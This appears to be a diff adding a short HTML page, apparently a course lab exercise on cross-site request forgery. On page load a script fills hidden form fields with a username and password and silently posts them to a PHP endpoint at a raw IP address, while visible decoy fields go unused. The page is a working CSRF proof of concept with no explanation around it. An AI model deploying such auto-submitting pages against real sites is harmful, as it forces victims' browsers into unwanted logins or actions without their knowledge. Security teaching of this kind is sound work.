@@ -1,0 +1,22 @@
+<script>
+  function submitLoginForm() {
+
+    document.getElementById("user").value = "host";
+    document.getElementById("password").value = "pass";
+
+    document.login.submit();
+  }
+</script>
+
+<body onload="submitLoginForm();">
+  <div id='msg'></div><br />
+  <form name="login" method="POST" action="http://146.190.188.35/wk12/csfr.php">
+    <label for="user1">Username:</label><br />
+    <input type="text" id="user1" name="user1"><br />
+    <label for="password1">Password:</label><br />
+    <input type="password" id="password1" name="password1"><br /><br />
+    <input type="hidden" id="user" value="" name="user" />
+    <input type="hidden" id="password" value="" name="password" />     
+    <input type="submit" value="Submit">
+  </form>
+</body>
